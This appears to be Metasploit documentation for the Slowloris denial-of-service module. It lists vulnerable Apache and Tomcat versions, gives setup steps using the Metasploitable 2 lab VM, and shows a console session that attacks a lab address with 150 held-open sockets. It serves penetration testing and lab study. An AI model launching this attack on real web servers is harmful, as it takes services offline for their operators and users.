## Vulnerable Application

This module tries to keep many connections to the target web server open and hold them open as long as possible.

To test this module download and setup the Metasploitable 2 vulnerable Linux virtual machine available at [https://sourceforge.net/projects/metasploitable/files/Metasploitable2/](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).

Vulnerable application versions include:

- Apache HTTP Server 1.x and 2.x
- Apache Tomcat 5.5.0 through 5.5.29, 6.0.0 through 6.0.27 and 7.0.0 beta

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/dos/http/slowloris`
3. Do: `set RHOST`
4. Do: `run`
5. Visit server URL in your web-browser.

## Scenarios

### Apache/2.2.8 - Ubuntu 8.04

```
msf > use auxiliary/dos/http/slowloris
msf auxiliary(slowloris) > show options

Module options (auxiliary/dos/http/slowloris):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   delay            15               yes       The delay between sending keep-alive headers
   rand_user_agent  true             yes       Randomizes user-agent with each request
   rhost            172.28.128.4     yes       The target address
   rport            80               yes       The target port
   sockets          150              yes       The number of sockets to use in the attack
   ssl              false            yes       Negotiate SSL/TLS for outgoing connections

msf auxiliary(slowloris) > set rhost 172.28.128.4
rhost => 172.28.128.4
msf auxiliary(slowloris) > run

[*] Starting server...
[*] Attacking 172.28.128.4 with 150 sockets
[*] Creating sockets...
[*] Sending keep-alive headers... Socket count: 150
```
